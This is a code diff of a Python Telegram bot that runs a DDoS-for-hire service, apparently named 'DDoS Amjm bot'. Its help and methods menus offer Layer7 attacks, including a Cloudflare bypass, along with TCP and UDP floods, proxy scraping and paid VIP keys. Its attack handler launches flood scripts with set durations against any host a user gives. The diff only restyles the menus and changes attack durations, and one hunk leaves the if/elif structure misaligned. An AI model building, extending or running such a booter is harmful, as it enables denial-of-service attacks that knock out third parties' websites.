@@ -105,20 +105,21 @@ load_users_from_database()
 @bot.message_handler(commands=['start', 'help'])
 def help(message):
     help_text = '''
+    🩸 ✱Welcome to DDoS Amjm bot
 📌 All Commands:
-DDoS Command (Website Attack)
+✱DDoS Command (Website Attack)
 - /attack + [methods] + [host]
 - /methods: To View Methods
 - /check + [host]: Check AntiDDoS
 - /proxy: Check Number of Proxies
-Useful Commands ^^
+✱Useful Commands ^^
 - /code + [host]: Get Website Source Code
 - /getproxy: Proxy Will Automatically Update After 10 Minutes
 - /list: View list of prx that can be obtained
 - /prx + Type of Proxy You Want to Get
 [ Live Proxy 95% Die 5% ]
 - /time: Number of Time Bot Active
-Info Admin
+✱Info Admin
 - /muakey: To Buy VIP Key
 - /admin: Info Admin
 - /on: On Bot
@@ -205,16 +206,16 @@ def methods(message):
 📌 All Methods:
 🚀 Layer7
 [ No Gov, Edu ]
-TLS
-BROWSER
-CF-BYPASS
-HTTP
-HTTPS
+✱TLS
+✱BROWSER
+✱CF-BYPASS
+✱HTTP
+✱HTTPS
 [ Pem Gov, Edu ]
-GOD
+✱GOD
 🚀 Layer4
-TCP-FLOOD
-UDP-FLOOD
+✱TCP-FLOOD
+✱UDP-FLOOD
 '''
     bot.reply_to(message, help_text)
 
@@ -288,7 +289,7 @@ def attack_command(message):
             command = ["python", "dosi.py","bypass", host, "443","1000","1000"]
             duration = 45
         command = ["python", "dosi.py","browser", host, "443","1000","1000"]
-            duration = 90
+            duration = 60
         elif method == 'HTTP':
             command = ["node", "HTTP-FLOOD.js", host, "300", "5", "90", "proxy1.txt"]
             duration = 90
@@ -297,7 +298,7 @@ def attack_command(message):
             duration = 120
         elif method == 'CF-BYPASS':
             command = ["python", "ddos.py", "cloud" ,host, "443", "1000", "15000", "120"]
-            duration = 120
+            duration = 90
         elif method == 'UDP-FLOOD':
             if not port.isdigit():
                 bot.reply_to(message, 'Port must be a positive integer.')
@@ -309,7 +310,7 @@ def attack_command(message):
                 bot.reply_to(message, 'Port must be a positive integer.')
                 return
             command = ["python", "tcp.py", host, port, "90", "64", "10"]
-            duration = 90
+            duration = 120
 
         cooldown_dict[username] = {'attack': current_time}
 
